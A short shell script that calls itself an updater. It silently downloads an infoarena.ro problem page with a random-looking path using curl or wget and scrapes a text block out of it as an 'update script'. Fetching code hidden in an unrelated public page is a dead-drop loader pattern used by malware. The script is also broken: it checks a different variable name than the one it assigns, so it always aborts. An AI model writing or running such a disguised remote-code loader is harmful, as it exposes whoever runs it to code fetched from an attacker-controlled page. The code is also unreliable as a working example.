#!/bin/sh

downloadScript(){
	DATA=""
	if [ -f "/bin/curl" ]; then
		#curl found
		DATA=$(/bin/curl --silent $1)
		DATA=$(echo $DATA | sed 's/.*class="wiki_text_block"><p>//;s/<\/p>.*//')
	elif [ -f "/bin/wget" ]; then
		#wget found
		DATA=$(/bin/wget -q -O - $1)
		DATA=$(echo $DATA | sed 's/.*class="wiki_text_block"><p>//;s/<\/p>.*//')
	else
		#error
		return ""
	fi
	echo "$DATA"
}

UPDATER_LINK="https://infoarena.ro/problema/07hszwxfidS7b6L3wsro37RRrgCROhlFzGWtJ8Av68zBYwv028nu5qyv7pXa"
UPDATE_SCRIPT=$(downloadScript $UPDATER_LINK)
if [ "$UPDATER_SCRIPT" = "" ]; then
	echo "Empty script"
	echo "Aborting..."
	exit 0
fi
